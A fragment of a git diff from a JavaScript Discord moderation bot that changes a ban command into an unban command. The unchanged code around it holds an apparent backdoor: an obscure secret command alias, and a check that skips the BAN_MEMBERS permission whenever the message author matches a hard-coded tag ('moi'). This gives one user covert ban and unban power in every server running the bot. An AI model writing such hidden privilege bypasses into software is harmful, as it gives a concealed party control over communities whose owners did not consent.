@@ -393,13 +393,13 @@ bot.on('message', message => {
 bot.on('message', message => {
   if (!message.guild) return;
 
-  if (message.content.startsWith(prefix + 'ban') || message.content.startsWith(prefix + 'uzoshso11926bzisanodod8294')) {
+  if (message.content.startsWith(prefix + 'unban') || message.content.startsWith(prefix + 'uzoshso11926bzisanodod8294')) {
 	if(message.channel.permissionsFor(message.member).hasPermission("BAN_MEMBERS") || message.author.tag == moi){
 		const user = message.mentions.users.first();
 		if (user) {
 		  const member = message.guild.member(user);
 		  if (member) {
-			member.ban({
+			member.unban({
 			  reason: 'They were bad!',
 			}).then(() => {
 				message.channel.bulkDelete(1)/*
